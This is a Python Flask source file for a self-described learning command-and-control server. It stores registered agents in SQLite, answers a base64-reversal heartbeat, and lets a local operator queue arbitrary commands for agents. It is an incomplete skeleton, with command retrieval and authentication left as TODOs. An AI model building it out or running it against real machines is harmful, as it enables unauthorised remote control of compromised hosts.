from flask import Flask
from flask import request, abort
import base64
import sqlite3 as sl

################
# DATABASE SETUP
################

# For dec purposes keep the DB in memory
#conn = sl.connect('agents.db', check_same_thread=False)
conn = sl.connect(':memory:', check_same_thread=False)

# Create tables agents and commands
c = conn.cursor()
c.execute("""CREATE TABLE agents (
            id INTEGER,
            ip TEXT,
            hostname TEXT,
            sleeptime INTEGER,
            note TEXT
    )""")
c.execute("""CREATE TABLE commands (
            agent_id INTEGER,
            issued_timestamp TEXT,
            command TEXT,
            reported_done_timestamp TEXT,
            result TEXT,
            done INTEGER
    )""")
conn.commit()
print("DB initialized")

##############
# API - AGENT ENDPOINTS
##############
# TODO: add authentication witch chcecking some secret value
# TODO: add function to check for newly issued commands
# TODO: add function to report for command results

app = Flask(__name__)

@app.route("/")
def hello_world():
    return "<p>Hello, World!</p>"

@app.route('/about')
def hello():
    return 'Simple C2 server built for learning purpposes'

# Register new agent and store it in DB
# TODO: check for duplicates of ID
@app.route('/register')
def register():
    id = request.args.get('id',default = 0, type = int)
    ip = request.args.get('ip', default = 'TBD', type = str)
    hostname = request.args.get('hostname', default = 'TBD', type = str)
    sleeptime = request.args.get('sleeptime', default = 3, type = int)
    note = request.args.get('note', default = '', type = str)

    if (id < 1000 or id > 9999):
        return f"Use id between 1000 and 9999"
    c.execute("INSERT INTO agents (id, ip, hostname, sleeptime, note) VALUES (?,?,?,?,?)", (id, ip, hostname, sleeptime, note))
    return f"Registered agent with id: {id}"


# Heartbeat function takes a base64-encoded string, decodes it, reverses an encodes again.
# The purpose is that client can check that it is still communicating with genuine C2 server.
@app.route('/heartbeat/<string:heartbeat>')
def heartbeat(heartbeat):
    heartbeat_bytes = heartbeat.encode('ascii')
    heartbeat_decoded = base64.b64decode(heartbeat_bytes)
    heartbeat = heartbeat_decoded.decode('ascii')

    heartbeat = heartbeat[::-1]

    heartbeat_bytes = heartbeat.encode('ascii')
    heartbeat_encoded = base64.b64encode(heartbeat_bytes)
    heartbeat_bytes = heartbeat_encoded.decode('ascii')
    return f"{heartbeat_bytes}"

##############
# API - CLIENT ENDPOINTS
##############
# TODO: make some basic UI?

# List all registered agents
@app.route('/ls/agents')
def lsagents():
    if request.remote_addr != '127.0.0.1':
        abort(403)  # Forbidden

    c.execute("SELECT * FROM agents")
    agents = c.fetchall()
    results = "Agents:<br/>"
    for agent in agents:
        results+= str(agent)
        results += '<br/>'
    return f"{results}"

# Show agent and its command history for a given agent id
@app.route('/ls/agent')
def lsagent():
    if request.remote_addr != '127.0.0.1':
        abort(403)  # Forbidden

    id = request.args.get('id',default = 0, type = int)
    if (id < 1000 or id > 9999):
        return f"Invalid agent id"

    results = "Agent:<br/>"
    c.execute("SELECT * FROM agents WHERE id = ?", (id,))
    agents = c.fetchall()
    for agent in agents:
        results += str(agent)
        results += '<br/>'
    
    results += "<br/><br/>"
    results += "Agent commands:"

    c.execute("SELECT * FROM commands WHERE agent_id = ?", (id,))
    agents = c.fetchall()
    for agent in agents:
        results += str(agent)
        results += '<br/>'

    return f"{results}"

# Issue a command to an agent
# TODO: forbid issuing command to non-existent agent
@app.route('/command')
def issuecommand():
    if request.remote_addr != '127.0.0.1':
        abort(403)  # Forbidden

    id = request.args.get('id',default = 0, type = int)
    if (id < 1000 or id > 9999):
        return f"Invalid agent id"
    
    command = request.args.get('command', default = '', type = str)
    if (len(command) <= 1 ):
        return f"Invalid command"
    
    c.execute("INSERT INTO commands (agent_id, issued_timestamp, command, reported_done_timestamp, result, done) VALUES (?, CURRENT_TIMESTAMP,?,?,?,?)", (id, command, '', '', 0))

    return f"Command {command} issued to agent ID {id}"